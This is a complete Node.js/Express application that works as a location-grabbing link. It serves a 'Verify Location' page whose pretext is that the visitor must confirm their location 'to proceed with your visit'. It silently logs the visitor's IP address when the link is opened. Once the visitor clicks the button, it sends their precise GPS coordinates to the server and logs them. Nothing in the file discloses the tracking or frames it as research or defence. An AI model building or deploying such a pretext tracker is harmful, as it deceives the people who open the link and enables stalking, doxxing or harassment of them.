const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);

// Parse JSON request bodies
app.use(express.json());

// Main page route
app.get('/', (req, res) => {
    const userIp = req.headers['x-forwarded-for'] 
        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
        : req.socket.remoteAddress;

    console.log("[LOG] Link opened. IP address: " + userIp);

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Verify Location</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    background-color: #f4f4f9;
                }
                .card {
                    background: white;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
                    text-align: center;
                    max-width: 400px;
                }
                button {
                    background-color: #007bff;
                    color: white;
                    border: none;
                    padding: 12px 20px;
                    font-size: 16px;
                    border-radius: 5px;
                    cursor: pointer;
                    margin-top: 15px;
                }
                button:hover {
                    background-color: #0056b3;
                }
                #status {
                    margin-top: 15px;
                    color: #555;
                }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>Welcome!</h1>
                <p>Please confirm your location to proceed with your visit.</p>
                <button id="locBtn">Verify My Location</button>
                <p id="status"></p>
            </div>

            <script>
                const btn = document.getElementById('locBtn');
                const status = document.getElementById('status');

                btn.addEventListener('click', () => {
                    if ("geolocation" in navigator) {
                        status.textContent = "Requesting location permission...";
                        
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                status.textContent = "Location verified! Thank you.";
                                btn.style.display = "none";

                                const data = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy + " meters"
                                };

                                // Send exact coordinates to the server
                                fetch('/save-location', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify(data)
                                });
                            },
                            (error) => {
                                status.textContent = "Unable to retrieve location. Permission was denied or timed out.";
                                console.log("Geolocation error: " + error.message);
                            },
                            { enableHighAccuracy: true, timeout: 10000 }
                        );
                    } else {
                        status.textContent = "Geolocation is not supported by your browser.";
                    }
                });
            </script>
        </body>
        </html>
    `);
});

// Endpoint to log precise GPS coordinates from the client
app.post('/save-location', (req, res) => {
    const { latitude, longitude, accuracy } = req.body;
    
    console.log(`[GPS LOG] Precise Location - Lat: ${latitude}, Lon: ${longitude} (Accuracy: ${accuracy})`);
    
    res.status(200).json({ status: 'success' });
});

app.listen(PORT, () => {
    console.log("Server is running on port " + PORT);
});
